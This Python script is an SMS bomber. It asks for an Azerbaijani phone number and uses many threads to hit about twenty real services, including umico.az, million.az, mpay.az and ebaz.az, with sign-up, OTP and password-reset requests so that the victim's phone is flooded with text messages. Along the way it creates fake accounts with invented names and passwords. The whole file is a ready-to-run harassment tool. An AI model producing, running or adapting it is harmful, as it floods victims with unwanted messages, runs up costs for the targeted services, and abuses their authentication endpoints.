import requests
import threading

def send_post_request(url, headers, data, thread_owner, thread_num, total_requests, if_json=True, max_retries=6):
    for i in range(total_requests):
        retries = 0
        success = False
        while not success and retries < max_retries:
            try:
                if if_json:
                    response = requests.post(url, headers=headers, json=data)
                else:
                    response = requests.post(url, headers=headers, data=data)
                
                if 200 <= response.status_code < 500:
                    success = True
                    print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}')
                else:
                    print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}, Retrying...')
                    retries += 1
                     
            except requests.exceptions.RequestException as e:
                print(f'{thread_owner}>{thread_num}, request {i+1}, Error: {e}, Retrying...')
                retries += 1
                 
            if retries == max_retries:
                print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}, Failed')

def send_get_request(url, headers, data, thread_owner, thread_num, total_requests, if_json=True, max_retries=6):
    for i in range(total_requests):
        retries = 0
        success = False
        while not success and retries < max_retries:
            try:
                if if_json:
                    response = requests.get(url, headers=headers, json=data)
                else:
                    response = requests.get(url, headers=headers, params=data)
                
                if 200 <= response.status_code < 500:
                    success = True
                    print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}')
                else:
                    print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}, Retrying...')
                    retries += 1
                     
            except requests.exceptions.RequestException as e:
                print(f'{thread_owner}>{thread_num}, request {i+1}, Error: {e}, Retrying...')
                retries += 1
                 
            if retries == max_retries:
                print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}, Failed')

def send_put_request(url, headers, data, thread_owner, thread_num, total_requests, if_json=True, max_retries=6):
    for i in range(total_requests):
        retries = 0
        success = False
        while not success and retries < max_retries:
            try:
                if if_json:
                    response = requests.put(url, headers=headers, json=data)
                else:
                    response = requests.put(url, headers=headers, data=data)
                
                if 200 <= response.status_code < 500:
                    success = True
                    print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}')
                else:
                    print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}, Retrying...')
                    retries += 1
                     
            except requests.exceptions.RequestException as e:
                print(f'{thread_owner}>{thread_num}, request {i+1}, Error: {e}, Retrying...')
                retries += 1
                 
            if retries == max_retries:
                print(f'{thread_owner}>{thread_num}, request {i+1}, status: {response.status_code}, Failed')

def main():
    total_requests = int(input("SMS Sayı "))
    threads = int(input("Multi Request sayı "))

    requests_per_thread = total_requests // threads
    extra_requests = total_requests % threads
    
    

    phone_number = input("Nömrə +994")
    
    umico_url = "https://customer.umico.az/v2/clients/account/sign-up"
    umico_headers = {}
    umico_data = {
        "phone": f"+994{phone_number}"
    }
    
    umireg_url = f"https://customer.umico.az/v2/clients/account/sign-in?phone=%2B994{phone_number}"
    umireg_headers = {}
    umireg_data = {}
    
    million_url = "https://pgapi.million.az/accounts/registration-request"
    million_headers = {}
    million_data = {
    "phoneNumber": f"994{phone_number}"
    }
    
    milreg_url = "https://pgapi.million.az/accounts/reset-password-request"
    milreg_headers = {}
    milreg_data = {
    "phoneNumber": f"994{phone_number}"
    }
    
    port_url = "https://portmanat.az/register"
    port_headers = {}
    port_data = {
        "number": f"0{phone_number}",
        "lang":"az"
    }
    
    portr_url = "https://portmanat.az/resetPassword"
    portr_headers = {}
    portr_data = {
        "username": f"0{phone_number}",
        "lang":"az"
    }
    
    pro_url = "https://api.promusic.az/api/v1/password/forgot"
    pro_headers = {}
    pro_data = {
        "phone": f"994{phone_number}"
    }
    
    mpayr_url = "https://endpoint.mpay.az/api/v1/users/forgot-password"
    mpayr_headers = {
        'Device-Type': 'WEB'
    }
    mpayr_data = {
        "username": f"+994{phone_number}"
    }
    
    mpay_url = "https://endpoint.mpay.az/api/v2/users/signup"
    mpay_headers = {
        'Device-Type': 'WEB'
    }
    mpay_data = {
        "username": f"+994{phone_number}",
        "password":"DjgkJf?!74y72?xS"
    }
    
    baz_url = "https://api.ebaz.az/registrationSendOTP"
    baz_headers = {}
    baz_data = {
        "mobileNum": f"+994{phone_number}"
    }
    
    bazr_url = "https://api.ebaz.az/loginSendOTP"
    bazr_headers = {}
    bazr_data = {
        "mobileNum": f"+994{phone_number}"
    }
    
    rose_url = "https://www.roses.az/Account/SendSmsCode"
    rose_headers = {}
    rose_data = {"phonenumber": phone_number}
    
    roser_url = "https://www.roses.az/Account/SendSmsForgotPassword"
    roser_headers = {}
    roser_data = {"phonenumber": phone_number}
    
    osp_url = "https://osp.az/ws/auth/signup"
    osp_headers = {}
    osp_data = {
        "lang":"az",
        "phone": f"994{phone_number}",
        "password":"hggGjfy57875","pin":"GJGY74H"
    }
    
    evireg_url = "https://evial.az/api/account/register"
    evireg_headers = {}
    evireg_data = {
        "facilityNameFront":"fhskslld",
        "ownershipFront":"fjfldlmn",
        "emailFront": f"grbdlc.jd{phone_number}pyjdn@gmail.com",
        "contactNoFront": f"+994{phone_number}",
        "usertype":2
    }
    
    evial_url = "https://evial.az/api/account/forget-password"
    evial_headers = {}
    evial_data = {
        "emailFront": f"+994{phone_number}"
    }
    
    osimr_url = "https://personal.osim.az/auth/register"
    osimr_headers = {}
    osimr_data = {
        "phone": f"+994{phone_number}",
        "email": f"flsn.kdk{phone_number}fk@gmail.com",
        "lastName":"qaymaq",
        "firstName":"portagal",
        "middleName":"sogan",
        "personalId":"jdkt6jd",
        "gender":"1",
        "birthday":"1998-05-12",
        "undefined_submit":"",
        "password":"M9h8AWN}k>]Nb=,",
        "repeat":"M9h8AWN}k>]Nb=,"
    }
    
    osim_url = "https://personal.osim.az/auth/forget-password"
    osim_headers = {}
    osim_data = {
        "phone": f"+994{phone_number}"
    }
    
    azdo_url = "https://api.azdo.az/api/v1/registrations"
    azdo_headers = {}
    azdo_data = {
        "Mobile": f"+994{phone_number}"
    }
    
    azdo_response = requests.post(azdo_url, headers=azdo_headers, json=azdo_data)
    
    response_data = azdo_response.json()
    registration_id = response_data["ID"]
    
    azdr_url = f"https://api.azdo.az/api/v1/registrations/{registration_id}/send-otp"
    azdr_headers = {}
    azdr_data = {}

    thread_list = []

    for i in range(threads):
        if i < extra_requests:
            umico_thread = threading.Thread(target=send_post_request, args=(umico_url, umico_headers, umico_data, "umico", i+1, requests_per_thread + 1))
            umireg_thread = threading.Thread(target=send_get_request, args=(umireg_url, umireg_headers, umireg_data, "umireg", i+1, requests_per_thread + 1))
            million_thread = threading.Thread(target=send_post_request, args=(million_url, million_headers, million_data, "million", i+1, requests_per_thread + 1))
            milreg_thread = threading.Thread(target=send_post_request, args=(milreg_url, milreg_headers, milreg_data, "milreg", i+1, requests_per_thread + 1))
            port_thread = threading.Thread(target=send_post_request, args=(port_url, port_headers, port_data, "port", i+1, requests_per_thread + 1))
            portr_thread = threading.Thread(target=send_post_request, args=(portr_url, portr_headers, portr_data, "portr", i+1, requests_per_thread + 1))
            pro_thread = threading.Thread(target=send_post_request, args=(pro_url, pro_headers, pro_data, "pro", i+1, requests_per_thread + 1))
            mpayr_thread = threading.Thread(target=send_post_request, args=(mpayr_url, mpayr_headers, mpayr_data, "mpayr", i+1, requests_per_thread + 1))
            mpay_thread = threading.Thread(target=send_post_request, args=(mpay_url, mpay_headers, mpay_data, "mpay", i+1, requests_per_thread + 1))
            baz_thread = threading.Thread(target=send_post_request, args=(baz_url, baz_headers, baz_data, "baz", i+1, requests_per_thread + 1))
            bazr_thread = threading.Thread(target=send_post_request, args=(bazr_url, bazr_headers, bazr_data, "bazr", i+1, requests_per_thread + 1))
            rose_thread = threading.Thread(target=send_post_request, args=(rose_url, rose_headers, rose_data, "rose", i+1, requests_per_thread + 1, False))
            roser_thread = threading.Thread(target=send_post_request, args=(roser_url, roser_headers, roser_data, "roser", i+1, requests_per_thread + 1, False))
            osp_thread = threading.Thread(target=send_post_request, args=(osp_url, osp_headers, osp_data, "osp", i+1, requests_per_thread + 1))
            evireg_thread = threading.Thread(target=send_post_request, args=(evireg_url, evireg_headers, evireg_data, "evireg", i+1, requests_per_thread + 1))
            evial_thread = threading.Thread(target=send_post_request, args=(evial_url, evial_headers, evial_data, "evial", i+1, requests_per_thread + 1))
            osimr_thread = threading.Thread(target=send_post_request, args=(osimr_url, osimr_headers, osimr_data, "osimr", i+1, requests_per_thread + 1))
            osim_thread = threading.Thread(target=send_post_request, args=(osim_url, osim_headers, osim_data, "osim", i+1, requests_per_thread + 1))
            azdo_thread = threading.Thread(target=send_post_request, args=(azdo_url, azdo_headers, azdo_data, "azdo", i+1, requests_per_thread + 1))
            azdr_thread = threading.Thread(target=send_put_request, args=(azdr_url, azdr_headers, azdr_data, "azdr", i+1, requests_per_thread + 1))
        else:
            umico_thread = threading.Thread(target=send_post_request, args=(umico_url, umico_headers, umico_data, "umico", i+1, requests_per_thread))
            umireg_thread = threading.Thread(target=send_get_request, args=(umireg_url, umireg_headers, umireg_data, "umireg", i+1, requests_per_thread))
            million_thread = threading.Thread(target=send_post_request, args=(million_url, million_headers, million_data, "million", i+1, requests_per_thread))
            milreg_thread = threading.Thread(target=send_post_request, args=(milreg_url, milreg_headers, milreg_data, "milreg", i+1, requests_per_thread))
            port_thread = threading.Thread(target=send_post_request, args=(port_url, port_headers, port_data, "port", i+1, requests_per_thread))
            portr_thread = threading.Thread(target=send_post_request, args=(portr_url, portr_headers, portr_data, "portr", i+1, requests_per_thread))
            pro_thread = threading.Thread(target=send_post_request, args=(pro_url, pro_headers, pro_data, "pro", i+1, requests_per_thread))
            mpayr_thread = threading.Thread(target=send_post_request, args=(mpayr_url, mpayr_headers, mpayr_data, "mpayr", i+1, requests_per_thread))
            mpay_thread = threading.Thread(target=send_post_request, args=(mpay_url, mpay_headers, mpay_data, "mpay", i+1, requests_per_thread))
            baz_thread = threading.Thread(target=send_post_request, args=(baz_url, baz_headers, baz_data, "baz", i+1, requests_per_thread))
            bazr_thread = threading.Thread(target=send_post_request, args=(bazr_url, bazr_headers, bazr_data, "bazr", i+1, requests_per_thread))
            rose_thread = threading.Thread(target=send_post_request, args=(rose_url, rose_headers, rose_data, "rose", i+1, requests_per_thread, False))
            roser_thread = threading.Thread(target=send_post_request, args=(roser_url, roser_headers, roser_data, "roser", i+1, requests_per_thread, False))
            osp_thread = threading.Thread(target=send_post_request, args=(osp_url, osp_headers, osp_data, "osp", i+1, requests_per_thread))
            evireg_thread = threading.Thread(target=send_post_request, args=(evireg_url, evireg_headers, evireg_data, "evireg", i+1, requests_per_thread))
            evial_thread = threading.Thread(target=send_post_request, args=(evial_url, evial_headers, evial_data, "evial", i+1, requests_per_thread))
            osimr_thread = threading.Thread(target=send_post_request, args=(osimr_url, osimr_headers, osimr_data, "osimr", i+1, requests_per_thread))
            osim_thread = threading.Thread(target=send_post_request, args=(osim_url, osim_headers, osim_data, "osim", i+1, requests_per_thread))
            azdo_thread = threading.Thread(target=send_post_request, args=(azdo_url, azdo_headers, azdo_data, "azdo", i+1, requests_per_thread))
            azdr_thread = threading.Thread(target=send_put_request, args=(azdr_url, azdr_headers, azdr_data, "azdr", i+1, requests_per_thread))
        
        thread_list.append(umico_thread)
        thread_list.append(umireg_thread)
        thread_list.append(million_thread)
        thread_list.append(milreg_thread)
        thread_list.append(port_thread)
        thread_list.append(portr_thread)
        thread_list.append(pro_thread)
        thread_list.append(mpayr_thread)
        thread_list.append(mpay_thread)
        thread_list.append(baz_thread)
        thread_list.append(bazr_thread)
        thread_list.append(rose_thread)
        thread_list.append(roser_thread)
        thread_list.append(osp_thread)
        thread_list.append(evireg_thread)
        thread_list.append(evial_thread)
        thread_list.append(osimr_thread)
        thread_list.append(osim_thread)
        thread_list.append(azdo_thread)
        thread_list.append(azdr_thread)
        umico_thread.start()
        umireg_thread.start()
        million_thread.start()
        milreg_thread.start()
        port_thread.start()
        portr_thread.start()
        pro_thread.start()
        mpayr_thread.start()
        mpay_thread.start()
        baz_thread.start()
        bazr_thread.start()
        rose_thread.start()
        roser_thread.start()
        osp_thread.start()
        evireg_thread.start()
        evial_thread.start()
        osimr_thread.start()
        osim_thread.start()
        azdo_thread.start()
        azdr_thread.start()

    for thread in thread_list:
        thread.join()


if __name__ == "__main__":
    main()
